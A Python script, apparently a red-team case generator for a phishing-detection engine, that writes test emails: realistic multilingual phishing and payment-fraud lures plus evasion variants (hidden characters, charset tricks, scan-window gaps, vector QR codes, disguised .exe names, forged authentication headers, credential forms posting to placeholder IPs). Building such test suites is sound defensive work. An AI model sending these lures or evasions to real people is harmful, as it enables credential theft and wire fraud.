#!/usr/bin/env python3
"""Red-team case generator for the VIGILYX evasion harness.

Writes .eml samples into tests/redteam_cases/. Controls must be flagged;
evasions probe specific bypass vectors identified in the code audit.
"""
import base64
import os
import quopri

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)))

BASE_HEADERS = (
    "From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>\r\n"
    "To: employee@corp.internal\r\n"
    "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
    "Message-ID: <{mid}@partner.example>\r\n"
)

EV02_HEADERS = (
    "From: Microsoft Support <support@microsoft.example>\r\n"
    "To: employee@corp.internal\r\n"
    "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
    "Message-ID: <{mid}@microsoft.example>\r\n"
)

def eml(mid, subject, body_headers, body):
    h = BASE_HEADERS.format(mid=mid)
    h += f"Subject: {subject}\r\n{body_headers}\r\n"
    return (h + body).encode("utf-8")

def eml_with_headers(headers, mid, subject, body_headers, body):
    h = headers.format(mid=mid)
    h += f"Subject: {subject}\r\n{body_headers}\r\n"
    return (h + body).encode("utf-8")

def write(name, data: bytes):
    with open(os.path.join(OUT, name), "wb") as f:
        f.write(data)
    print("wrote", name, len(data), "bytes")

# ---------------- controls (must be caught) ----------------

PHISH_HTML = (
    "<html><body>"
    "<p>尊敬的用户：系统检测到您的账户存在异常登录，为保障您的资金安全，"
    "请立即点击下方链接验证身份，24小时内未验证将冻结账户。</p>"
    "<p><a href='http://203.0.113.50/verify/login'>http://203.0.113.50/verify/login</a></p>"
    "<p>客服电话 400-123-4567</p>"
    "</body></html>"
)
write("ctrl01_plain_cn_phishing.eml",
      eml("ctrl01", "邮箱安全验证提醒",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          PHISH_HTML))

bec_text = (
    "Hi,\n\n"
    "I'm in a meeting right now and can't take calls. Our supplier changed their\n"
    "bank account — any payments due must go to the new account below today:\n\n"
    "Beneficiary: Shenzhen Trading Co.\n"
    "Bank: China Merchants Bank\n"
    "Account No.: 6225 8812 3456 7890\n\n"
    "Please process the wire transfer urgently before end of day and confirm by email.\n\n"
    "Regards,\nCEO Office"
)
write("ctrl02_bec_payment_change.eml",
      eml("ctrl02", "Urgent: supplier bank account change - process today",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
          bec_text))

# QP soft line-break splitting a keyword's UTF-8 bytes across lines.
qp_body = quopri.encodestring(
    "您的账户存在异常，请立即登录验证：http://203.0.113.50/verify\r\n".encode("utf-8"),
    quotetabs=False)
# force a soft break in the middle of 账 (E8 B4 A6)
raw = "您的账=E8=B4=\r\n=A6户存在异常，请立即登录验证：http://203.0.113.50/verify\r\n"
write("ctrl03_qp_split_keyword.eml",
      eml("ctrl03", "账户异常通知",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n"
          "Content-Transfer-Encoding: quoted-printable\r\n",
          raw))

# ---------------- evasions ----------------

# ev01: CJK keywords broken by &hairsp; named entities (not in the decoder's
# named set; its letters survive into the compact view, still breaking the match)
entity_html = (
    "<html><body>"
    "<p>尊敬的用户：系统检测到您的账&hairsp;户存在异&hairsp;常登录，为保障您的资金安全，"
    "请立&hairsp;即点击下方链接验&hairsp;证身份，24小时内未验证将冻&hairsp;结账户。</p>"
    "<p><a href='https://login-secure.invalid/sso/login'>https://login-secure.invalid/sso/login</a></p>"
    "</body></html>"
)
write("ev01_entity_hairsp_break.eml",
      eml("ev01", "账号安全提醒",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          entity_html))

# ev02: same lure, keywords broken by CSS-zero-sized latin letters (invisible
# to the reader, tags stripped to spaces, letters are alphanumeric so the
# compact view keeps them between the keyword chars)
css_html = (
    "<html><head><style>.x{font-size:0;opacity:0}</style></head><body>"
    "<p>尊敬的用户：您的账<span class='x'>x</span>户存在异常，请立即点击链接完成身"
    "<span class='x'>y</span>份验证，否则账户将被冻<span class='x'>z</span>结。</p>"
    "<p><a href='https://microsoft-login.example/sso/login'>https://microsoft-login.example/sso/login</a></p>"
    "</body></html>"
)
write("ev02_css_hidden_char_break.eml",
      eml_with_headers(EV02_HEADERS, "ev02", "账户异常",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          css_html))

# ev03: traditional-Chinese lure (no traditional keywords expected in a
# simplified-oriented seed)
trad_html = (
    "<html><body>"
    "<p>親愛的用戶：系統偵測到您的帳戶存在異常登入，為保障您的資金安全，"
    "請立即點擊下方連結驗證身分，24小時內未驗證將凍結帳戶。</p>"
    "<p><a href='https://login-secure.invalid/sso/login'>https://login-secure.invalid/sso/login</a></p>"
    "</body></html>"
)
write("ev03_traditional_chinese.eml",
      eml("ev03", "帳戶安全驗證提醒",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          trad_html))

# ev04: keywords broken with &hairsp; + lure hosted on a shared trusted
# platform (docs.google.com form) — probes the structural platform bypass
gdocs_html = (
    "<html><body>"
    "<p>您好，人力资&hairsp;源部通知：请通过下方链接完成本年度薪&hairsp;酬信息确认，"
    "逾期未确认将影响工资发放。</p>"
    "<p><a href='https://docs.google.com/forms/d/e/1FAIpQLSfFakeFormId/viewform'>"
    "https://docs.google.com/forms/d/e/1FAIpQLSfFakeFormId/viewform</a></p>"
    "</body></html>"
)
write("ev04_trusted_platform_lure.eml",
      eml("ev04", "薪酬信息确认",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          gdocs_html))

# ev05: userinfo confusion — anchor shows the corp SSO, href goes to attacker
userinfo_html = (
    "<html><body>"
    "<p>IT 服务中心：您的域密码即将过期，请登录统一认证平台修改密码。</p>"
    "<p><a href='https://sso.corp.internal@attacker-mail.example/login?sso=1'>"
    "https://sso.corp.internal/login</a></p>"
    "</body></html>"
)
write("ev05_userinfo_url.eml",
      eml("ev05", "域密码即将过期",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          userinfo_html))

# ev06: clean body, phishing page as HTML attachment
phish_attachment = (
    "<html><body style='font-family:sans-serif'>"
    "<h2>企业邮箱安全验证</h2>"
    "<p>您的邮箱账户存在异常，请立即输入密码完成验证，否则账户将被停用。</p>"
    "<form action='http://203.0.113.50/harvest' method='post'>"
    "账号：<input name='u'><br>密码：<input type='password' name='p'><br>"
    "<input type='submit' value='立即验证'></form></body></html>"
)
b64_att = base64.b64encode(phish_attachment.encode("utf-8")).decode()
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"B1\"\r\n\r\n"
    "--B1\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "您好，附件是本月的系统通知，请查收。\r\n"
    "--B1\r\n"
    "Content-Type: text/html; name=\"=?utf-8?B?57O7576k6LWe5a6h6Zmi6L+H6YePLmh0bWw=?=\"\r\n"
    "Content-Disposition: attachment; filename=\"=?utf-8?B?57O7576k6LWe5a6h6Zmi6L+H6YePLmh0bWw=?=\"\r\n"
    "Content-Transfer-Encoding: base64\r\n\r\n" + b64_att + "\r\n--B1--\r\n"
)
write("ev06_html_attachment_phish.eml",
      eml("ev06", "系统安全通知", body, ""))

# ev07: dilution — ctrl01 lure buried in 15KB of benign newsletter filler
filler = "".join(
    f"本周行业动态第{i}条：企业数字化转型持续推进，供应链协同效率稳步提升，"
    "绿色低碳与合规治理成为关注重点，相关实践案例详见内刊。\n"
    for i in range(60)
)
dilution_text = (
    "【企业内刊】2026年8月第2期\n\n" + filler + "\n\n"
    "另：系统检测到您的账户存在异常登录，为保障您的资金安全，"
    "请立即点击链接验证：http://203.0.113.50/verify/login（24小时内未验证将冻结账户）\n"
)
write("ev07_dilution.eml",
      eml("ev07", "企业内刊 2026-08 第2期",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
          dilution_text))

# ev08: phishing forwarded as message/rfc822 attachment, outer body clean
inner = eml("inner", "=?utf-8?B?56CB5a6D6K+3566h55CG5Zuw6YeP6Zeo6ZSQ5Lqk?=",
            "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
            PHISH_HTML)
inner_b64 = base64.b64encode(inner).decode()
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"B2\"\r\n\r\n"
    "--B2\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "FYI，供应商转来的通知，供参考。\r\n"
    "--B2\r\n"
    "Content-Type: message/rfc822; name=\"notice.eml\"\r\n"
    "Content-Disposition: attachment; filename=\"notice.eml\"\r\n"
    "Content-Transfer-Encoding: base64\r\n\r\n" + inner_b64 + "\r\n--B2--\r\n"
)
write("ev08_nested_rfc822.eml",
      eml("ev08", "Fwd: 供应商通知", body, ""))

# ev09: multipart/alternative — clean plain text + phishing HTML
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/alternative; boundary=\"B3\"\r\n\r\n"
    "--B3\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "您好，最新系统通知请见网页版。\r\n"
    "--B3\r\nContent-Type: text/html; charset=utf-8\r\n\r\n" + PHISH_HTML +
    "\r\n--B3--\r\n"
)
write("ev09_alt_clean_text.eml",
      eml("ev09", "系统通知", body, ""))

# ev10: image-only phishing — no keywords, image + IP button
img_html = (
    "<html><body>"
    "<img src='https://attacker-cdn.example/banner.png' width='600' height='200'>"
    "<a href='http://198.51.100.7/login'><img src='https://attacker-cdn.example/btn.png'"
    " width='200' height='60' alt='登录'></a>"
    "</body></html>"
)
write("ev10_image_only_phish.eml",
      eml("ev10", "邮箱验证",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          img_html))

# ev11: plain-text social-engineering contact lure (no links, no keywords)
lure_text = (
    "您好，我是财务部王经理。关于本季度供应商付款事宜，邮件里说不方便，\n"
    "请加我微信 138-0013-8000（备注部门+姓名），今天内对接一下付款账户变更，\n"
    "时间紧，先微信确认，不用回复邮件。\n"
)
write("ev11_plain_contact_lure.eml",
      eml("ev11", "付款对接",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
          lure_text))

# ev12: RTLO attachment name — "invoice" + U+202E + "gnp.exe" renders as
# "invoicexe.png" style confusion
exe_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"\x90" * 512
exe_b64 = base64.b64encode(exe_payload).decode()
rtlo_name = "=?utf-8?B?" + base64.b64encode("对账单2026\u202egnp.exe".encode()).decode() + "?="
body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"B4\"\r\n\r\n"
    "--B4\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
    "您好，附件为本月对账单，请查收核对。\r\n"
    "--B4\r\n"
    "Content-Type: application/octet-stream\r\n"
    f"Content-Disposition: attachment; filename=\"{rtlo_name}\"\r\n"
    "Content-Transfer-Encoding: base64\r\n\r\n" + exe_b64 + "\r\n--B4--\r\n"
)
write("ev12_rtlo_exe.eml", eml("ev12", "月度对账单", body, ""))

# ev13: English lure with letter-spacing — Latin keywords get no compact pass
eng_html = (
    "<html><body>"
    "<p>D e a r&nbsp; U s e r,&nbsp; y o u r&nbsp; m a i l b o x&nbsp; a c c o u n t&nbsp;"
    "w i l l&nbsp; b e&nbsp; d i s a b l e d .&nbsp; T o&nbsp; k e e p&nbsp; a c c e s s ,"
    "&nbsp; v e r i f y&nbsp; y o u r&nbsp; a c c o u n t&nbsp; n o w :</p>"
    "<p><a href='https://login-secure.invalid/sso/login'>https://login-secure.invalid/sso/login</a></p>"
    "</body></html>"
)
write("ev13_english_spaced.eml",
      eml("ev13", "Mailbox verification required",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          eng_html))

# ev16: ISO-2022-JP body lure. `decode_charset` runs its UTF-8 fast path
# BEFORE the charset-label lookup: ISO-2022-JP is pure 7-bit ASCII plus ESC
# escape sequences, so from_utf8() always succeeds and the body survives as
# raw escape bytes — the exact bug class the UTF-7 branch above fixed, but
# the ISO-2022 family was never given the same pre-fast-path handling.
# Every JA keyword list (224 phishing entries in the seed) is blind to the
# lure. The header path (decode_rfc2047) decodes iso-2022-jp correctly, so
# the lure lives in the body only and the subject stays neutral.
ja_lure = (
    "お客様へ\r\n"
    "\r\n"
    "セキュリティ確認のため、お客様のアカウントが停止されました。\r\n"
    "引き続きご利用いただくには、24時間以内に再ログインしてください。\r\n"
    "アカウント情報の確認とワンタイムパスワードの再設定が必要です。\r\n"
    "\r\n"
    "今すぐログインしてください:\r\n"
    "https://account-verify.example.co.jp/sso/login\r\n"
    "\r\n"
    "48時間以内に確認しない場合、アカウントが永久に停止されます。\r\n"
)
hdr16 = (
    BASE_HEADERS.format(mid="ev16")
    + "Subject: Notice\r\n"
    + "MIME-Version: 1.0\r\n"
    + "Content-Type: text/plain; charset=iso-2022-jp\r\n"
    + "Content-Transfer-Encoding: 7bit\r\n\r\n"
)
write("ev16_iso2022jp_body_lure.eml",
      hdr16.encode("ascii") + ja_lure.encode("iso2022_jp"))

# ctrl04: the SAME Japanese lure delivered as UTF-8. It must be flagged,
# proving the lure text itself scores and the only bypass variable in ev16
# is the body encoding.
write("ctrl04_utf8_ja_control.eml",
      eml("ctrl04", "Notice",
          "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
          ja_lure))

# ev17: class-based CSS hiding + TWO-letter breaks. Three gaps chained:
#   (1) html_scan strips <style> blocks before the css_hidden scan and only
#       matches inline style= attributes, so .x{display:none} class hiding is
#       invisible as a technique;
#   (2) compact_detection_view drops only a SINGLE ASCII letter sandwiched
#       between CJK chars — two letters survive both the raw view
#       ("账 kq 户") and the compact view ("账kq户");
#   (3) the letters are real alphanumerics, so no zero-width/控制符 counter
#       fires. The recipient's MUA applies the class and sees perfect prose.
def hide(two_letters):
    return f"<span class=x>{two_letters}</span>"

lure17 = (
    "<html><head><style>.x{display:none}</style></head><body>"
    "<p>尊敬的用户：系统检测到您的账" + hide("kq") + "户存在异" + hide("tb") + "常登"
    + hide("vm") + "录，为保障您的资金安全，请立" + hide("uj") + "即点击下方链"
    + hide("wn") + "接验" + hide("yn") + "证身份，24小" + hide("ef") + "时内未验"
    + hide("cu") + "证将冻" + hide("re") + "结账" + hide("ws") + "户。</p>"
    "<p><a href='https://update-center.example.info/login'>https://update-center.example.info/login</a></p>"
    "<p>客服电话 400-123-4567</p>"
    "</body></html>"
)
write("ev17_class_hidden_pair_break.eml",
      eml("ev17", "服务通知",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          lure17))

# ev18: windowed-scan blind spot. Bodies over 1.5 MiB are sampled as
# head/mid/tail 512 KiB windows; a 2 MiB body leaves [512K, 786K) and
# [1280K, 1572K) unsampled by content_scan. The full lure paragraph sits at
# ~640 KiB — inside the first gap. Parser budget (20 MiB) retains it.
BENIGN_FILLER = [
    "本周园区绿化养护按计划进行，相关灌溉设备已完成季度检修。",
    "食堂菜单已更新，新增风味窗口供应时段为每周二和周四。",
    "档案馆提醒各部门按时移交上季度文书材料，目录格式见内网规范。",
    "班车三号线自下月起调整发车时刻，具体班次表另行张贴。",
    "图书馆采购的新一批工具书已上架，可在三层阅览区查阅。",
    "办公楼空调系统进入秋季运行模式，温度设定统一调整为二十六度。",
    "物业服务中心已完成公共区域照明巡检，故障灯具已全部更换。",
    "运动会报名通道开启，各工会小组请在周五前提交参赛名单。",
]

def build_big_body(total_len, lure_at, lure):
    parts = []
    size = 0
    i = 0
    while size < total_len:
        parts.append(BENIGN_FILLER[i % len(BENIGN_FILLER)])
        parts.append("\r\n")
        size += len(BENIGN_FILLER[i % len(BENIGN_FILLER)].encode()) + 2
        i += 1
    filler = "".join(parts).encode()
    # char-boundary-safe prefix exactly up to lure_at bytes
    while filler[lure_at : lure_at + 1] and (filler[lure_at] & 0xC0) == 0x80:
        lure_at -= 1  # never true at sentence boundaries, defensive only
    body = filler[:lure_at] + lure + filler[lure_at : total_len - len(lure)]
    return body

lure18 = (
    "\r\n尊敬的用户：系统检测到您的账户存在异常登录，为保障您的资金安全，"
    "请立即点击下方链接验证身份，24小时内未验证将冻结账户。\r\n"
    "https://update-center.example.info/verify/login\r\n"
    "客服电话 400-123-4567\r\n\r\n"
).encode()
big_body = build_big_body(2 * 1024 * 1024, 640 * 1024, lure18)
hdr18 = (
    BASE_HEADERS.format(mid="ev18")
    + "Subject: 企业通讯 2026年8月 第32期\r\n"
    + "MIME-Version: 1.0\r\n"
    + "Content-Type: text/plain; charset=utf-8\r\n\r\n"
)
write("ev18_window_gap_lure.eml", hdr18.encode("utf-8") + big_body)

# ev19: undeclared-charset Cyrillic lure. decode_charset's absent-charset
# fallback decodes 8-bit bodies as GB18030 (rationale: CN MUAs omit charset
# when sending GBK). A windows-1251 Russian phish therefore becomes CJK
# mojibake inside the engine — every RU keyword list (mfa_bait_phrases_ru,
# account_security_threat_phrases_body, urgency, …) is blind — while the
# victim's MUA auto-sniffs windows-1251 and renders perfect Russian.
ru_lure = (
    "Внимание! Мы обнаружили подозрительный вход в вашу учётную запись.\r\n"
    "\r\n"
    "Проверьте свои настройки безопасности и подтвердите свою учётную запись,\r\n"
    "иначе учётная запись будет заблокирована в течение 24 часов.\r\n"
    "Подтвердите личность немедленно: войдите в систему и введите пароль,\r\n"
    "затем проверьте свой пароль в настройках безопасности:\r\n"
    "\r\n"
    "https://account-verify.example.ru/sso/login\r\n"
    "\r\n"
    "Служба безопасности корпоративной сети\r\n"
)
hdr19 = (
    BASE_HEADERS.format(mid="ev19")
    + "Subject: Notification\r\n"
    + "MIME-Version: 1.0\r\n"
    + "Content-Type: text/plain\r\n"          # no charset parameter
    + "Content-Transfer-Encoding: 8bit\r\n\r\n"
)
write("ev19_no_charset_ru_lure.eml",
      hdr19.encode("ascii") + ru_lure.encode("cp1251"))

# ctrl05: the SAME Russian lure with charset=windows-1251 declared — the
# engine decodes it correctly and the RU lists must fire.
hdr05 = (
    BASE_HEADERS.format(mid="ctrl05")
    + "Subject: Notification\r\n"
    + "MIME-Version: 1.0\r\n"
    + "Content-Type: text/plain; charset=windows-1251\r\n"
    + "Content-Transfer-Encoding: 8bit\r\n\r\n"
)
write("ctrl05_cp1251_ru_control.eml",
      hdr05.encode("ascii") + ru_lure.encode("cp1251"))

print("all cases written")

# ---------------- round 4: visual/QR layer ----------------
# Assets in assets/ regenerate with:
#   segno.make("http://203.0.113.60/sso/login", error='m').save(...)
#   PIL-drawn CJK lure text on a white PNG (see assets/qr.svg header comment)

ASSETS = os.path.join(OUT, "assets")

# ev20: pure-VECTOR SVG QR. attach_qr_scan only decodes raster carriers
# (attachments and data:image/png|jpeg|… base64). An SVG built from <path>
# rects has no embedded raster, so the QR module never sees it — while every
# MUA/browser renders it and every phone scans it. The lure lives in the QR
# payload; the body text stays neutral.
qr_svg = open(os.path.join(ASSETS, "qr.svg")).read()
# strip the XML prolog so it nests cleanly inside HTML
qr_svg_inline = qr_svg.split("?>", 1)[-1].strip()
svg_body = (
    "<html><body><p>请扫描下方二维码查看系统通知详情。</p>"
    + qr_svg_inline
    + "</body></html>"
)
write("ev20_svg_vector_qr.eml",
      eml("ev20", "系统通知",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          svg_body))

# ctrl06: the SAME QR payload and body text, raster PNG data-URI carrier —
# must be detected by attach_qr_scan, isolating the carrier as the only
# bypass variable in ev20.
import base64 as _b64
qr_png_b64 = _b64.b64encode(open(os.path.join(ASSETS, "qr.png"), "rb").read()).decode()
png_body = (
    "<html><body><p>请扫描下方二维码查看系统通知详情。</p>"
    + f"<img src=\"data:image/png;base64,{qr_png_b64}\" width=\"258\" height=\"258\">"
    + "</body></html>"
)
write("ctrl06_raster_qr_control.eml",
      eml("ctrl06", "系统通知",
          "MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n",
          png_body))

# ev21: pixel-level text lure. The whole account-freeze phish (plus the
# credential URL) is rendered INTO a PNG image; the visible body text is
# 50+ chars of benign newsletter prose, which defeats the
# `effective_text_len < 50` image-only gate. No links, no keywords, no QR.
lure_png_b64 = _b64.b64encode(open(os.path.join(ASSETS, "lure.png"), "rb").read()).decode()
ev21_text = (
    "您好，本期企业通讯已发布，内容包括园区活动安排、食堂菜单更新与"
    "班车时刻调整，详情请查看随附图片版公告。祝工作顺利！\r\n"
)
ev21_body = (
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"B21\"\r\n\r\n"
    "--B21\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n" + ev21_text +
    "--B21\r\n"
    "Content-Type: image/png; name=\"notice.png\"\r\n"
    "Content-Disposition: attachment; filename=\"notice.png\"\r\n"
    "Content-Transfer-Encoding: base64\r\n\r\n" + lure_png_b64 + "\r\n"
    "--B21--\r\n"
)
write("ev21_image_text_lure.eml", eml("ev21", "企业通讯 2026年9月 第33期", ev21_body, ""))

print("all cases written")

# ---------------- round 5: 20-vector sweep ----------------
# Each case isolates one suspected gap; bodies stay neutral where the vector
# is about link/attachment invisibility so a DELIVERED verdict indicts the
# extraction layer, not keyword luck.

IP = "203.0.113.60"
NEUTRAL = "系统维护通知：请点击下方入口查看详情并完成相应操作，谢谢配合。"

def html_eml(mid, subject, body, extra_headers=""):
    h = BASE_HEADERS.format(mid=mid) + extra_headers
    h += f"Subject: {subject}\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n"
    return (h + body).encode("utf-8")

def attach_eml(mid, subject, body_text, filename, ctype, payload_b64, cte="base64"):
    body = (
        "MIME-Version: 1.0\r\n"
        'Content-Type: multipart/mixed; boundary="BS"\r\n\r\n'
        "--BS\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n" + body_text +
        f"--BS\r\nContent-Type: {ctype}\r\n"
        f'Content-Disposition: attachment; filename="{filename}"\r\n'
        f"Content-Transfer-Encoding: {cte}\r\n\r\n" + payload_b64 + "\r\n--BS--\r\n"
    )
    return eml(mid, subject, body, "")

import base64 as b64m

# ev22: tab numeric entity inside scheme — browsers strip \t from URLs before
# parsing (whatwg), so ht&#9;tp:// navigates to the IP; the entity decodes to
# a tab which Url::parse rejects -> at most unparseable_url (+0.10).
write("ev22_tab_entity_scheme.eml", html_eml("ev22", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    f"<p><a href='ht&#9;tp://{IP}/verify/login'>查看详情</a></p></body></html>"))

# ev23: named &Tab; entity — decode_html_attribute_entities whitelist lacks Tab.
write("ev23_named_tab_scheme.eml", html_eml("ev23", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    f"<p><a href='ht&Tab;tp://{IP}/verify/login'>查看详情</a></p></body></html>"))

# ev24: forged Authentication-Results pass + Received headers stapled onto the
# ctrl01 lure — do attacker-supplied auth headers soften header_scan?
write("ev24_forged_auth_results.eml", html_eml("ev24", "邮箱安全验证提醒",
    "<html><body><p>尊敬的用户：系统检测到您的账户存在异常登录，为保障您的资金安全，"
    "请立即点击下方链接验证身份，24小时内未验证将冻结账户。</p>"
    f"<p><a href='http://{IP}/verify/login'>http://{IP}/verify/login</a></p></body></html>",
    "Received: from mail.partner.example (mail.partner.example [198.51.100.9])\r\n"
    "  by mx.corp.internal with ESMTPS id OK99;\r\n"
    "Authentication-Results: mx.corp.internal; spf=pass (sender of IP 198.51.100.9 allowed) smtp.mailfrom=partner.example; dkim=pass header.d=partner.example; dmarc=pass header.from=partner.example\r\n"))

# ev25: <base href> + relative href — the link layer sees the bare base URL
# only; the credential path exists nowhere as text.
write("ev25_base_href_relative.eml", html_eml("ev25", "系统通知",
    "<html><head><base href='http://" + IP + "/verify/'></head><body><p>" + NEUTRAL + "</p>"
    "<p><a href='login'>立即查看</a></p></body></html>"))

# ev26: form-action navigation — no <a> tag at all; renders as a button.
write("ev26_form_action_button.eml", html_eml("ev26", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    f"<form action='http://{IP}/verify/login'><button>查看详情</button></form>"
    "</body></html>"))

# ev27: SVG anchor with xlink:href + tab entity — attr name is not "href" and
# the scheme never appears literally.
write("ev27_svg_xlink_anchor.eml", html_eml("ev27", "系统通知",
    "<html><body><p>" + NEUTRAL + "</p>"
    "<svg width='120' height='40'><a xlink:href='ht&#9;tp://" + IP + "/verify/login'>"
    "<text x='8' y='26' font-size='16'>查看详情</text></a></svg>"
    "</body></html>"))

# ev28: HTML attachment whose only payload is a meta refresh to the IP.
att28 = ("<html><head><meta http-equiv='refresh' content='0;url=http://" + IP + "/verify/login'>"
         "</head><body>正在跳转，请稍候…</body></html>")
write("ev28_attach_meta_refresh.eml", attach_eml("ev28", "系统通知",
    "您好，附件为系统通知页面，请打开查看。", "notice.html", "text/html",
    b64m.b64encode(att28.encode()).decode()))

# ev29: attachment credential form assembled from JS string fragments so no
# static scan ever sees a contiguous <input type=password> or scheme.
frag = (
    "<html><body><div id='x'></div><script>"
    f"var h='<fo'+'rm act'+'ion=ht'+'tp://{IP}/lo'+'gin>';"
    "h+='<in'+'put name=pass ty'+'pe=pass'+'word>';"
    "h+='<bu'+'tton>确'+'认</bu'+'tton></fo'+'rm>';"
    "document.getElementById('x').innerHTML=h;</script></body></html>"
)
write("ev29_attach_js_form.eml", attach_eml("ev29", "身份确认",
    "您好，请打开附件完成身份确认。", "confirm.html", "text/html",
    b64m.b64encode(frag.encode()).decode()))

# ev30: .url InternetShortcut attachment pointing at the IP.
url30 = "[InternetShortcut]\r\nURL=http://" + IP + "/verify/login\r\n"
write("ev30_url_shortcut_attach.eml", attach_eml("ev30", "系统通知",
    "您好，请打开附件访问详情页面。", "details.url", "application/internet-shortcut",
    b64m.b64encode(url30.encode()).decode()))

# ev31: internal-authority display name + low-signal BEC body.
disp31 = b64m.b64encode("信息技术部-系统管理员".encode()).decode()
h31 = ("From: =?utf-8?B?" + disp31 + "?= <it-support@partner.example>\r\n"
       "To: employee@corp.internal\r\n"
       "Date: Thu, 13 Aug 2026 10:00:00 +0800\r\n"
       "Message-ID: <ev31@partner.example>\r\n"
       "Subject: 事务确认\r\n"
       "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n")
write("ev31_display_authority.eml",
      (h31 + "在吗？我这边有个事务需要你配合确认一下，回复我邮箱即可，细节电话沟通。\r\n").encode("utf-8"))

# ev32: accented-Latin keyword evasion — fold_common_confusable covers
# Cyrillic/Greek but not Latin-1 diacritics; "vérify yóur àccount" reads fine.
write("ev32_latin_diacritics.eml", html_eml("ev32", "Mailbox notice",
    "<html><body><p>Dear user, wé néed you to vérify yóur àccount immedïately."
    "Your màilbox will bé disabléd in 24 hours unless you confirmlink below.</p>"
    f"<p><a href='http://{IP}/verify'>http://{IP}/verify</a></p></body></html>"))

# ev33: English BEC paraphrase without stock phrases.
write("ev33_bec_paraphrase.eml", eml("ev33", "Payment run today",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    "Hi,\n\nThe supplier sent revised remittance details this morning — the old\n"
    "coordinates are void. Today's run must use the new ones:\n\n"
    "Beneficiary: Pacific Trade Ltd\nIBAN: GB29 NWBK 6016 1331 9268 19\n\n"
    "Confirm once the transfer is queued; I'm airborne most of the day.\n\n— CFO office\n"))

# ev34: URL folded across lines in plain text (mailers may rejoin on click).
write("ev34_folded_url_text.eml", eml("ev34", "系统通知",
    "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n",
    NEUTRAL + "\r\n详情入口：\r\nhttp://\r\n  " + IP + "/verify/login\r\n"))

# ev35: attachment meta refresh to a trusted hosted platform.
att35 = ("<html><head><meta http-equiv='refresh' content='0;url=https://docs.google.com/forms/d/e/1FAIpQLSfFake/login'>"
         "</head><body>正在打开安全验证页面…</body></html>")
write("ev35_attach_trusted_refresh.eml", attach_eml("ev35", "安全验证",
    "您好，请打开附件完成安全验证。", "verify.html", "text/html",
    b64m.b64encode(att35.encode()).decode()))

# ev36: attachment HTML using the 2-letter class-hidden keyword break — does
# attach_content get the compact second pass the body pipeline has?
att36 = ("<html><head><style>.x{display:none}</style></head><body>"
         "<p>尊敬的用户：您的账<span class=x>kq</span>户存在异<span class=x>tb</span>常，"
         "请立<span class=x>uj</span>即登<span class=x>vm</span>录验<span class=x>yn</span>证身份。</p>"
         f"<p><a href='http://{IP}/verify/login'>http://{IP}/verify/login</a></p></body></html>")
write("ev36_attach_hidden_pair.eml", attach_eml("ev36", "邮箱安全验证提醒",
    "您好，请打开附件查看详情。", "notice.html", "text/html",
    b64m.b64encode(att36.encode()).decode()))

# ev37: RFC2231 percent-encoded filename hiding the .exe extension.
exe37 = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"\x90" * 512
write("ev37_rfc2231_pct_filename.eml",
      eml("ev37", "对账单", (
        "MIME-Version: 1.0\r\n"
        'Content-Type: multipart/mixed; boundary="B37"\r\n\r\n'
        "--B37\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n您好，附件请查收。\r\n"
        "--B37\r\nContent-Type: application/octet-stream\r\n"
        "Content-Disposition: attachment; filename*=utf-8''%E5%AF%B9%E8%B4%A6%E5%8D%95%2Eexe\r\n"
        "Content-Transfer-Encoding: base64\r\n\r\n"
        + b64m.b64encode(exe37).decode() + "\r\n--B37--\r\n"), ""))

# ev38: ceo local-part homoglyph + pure trust lure, no keywords, no links.
disp38 = b64m.b64encode("张总-CEO办公室".encode()).decode()
h38 = ("From: =?utf-8?B?" + disp38 + "?= <ce0@partner.example>\r\n"
       "To: employee@corp.internal\r\n"
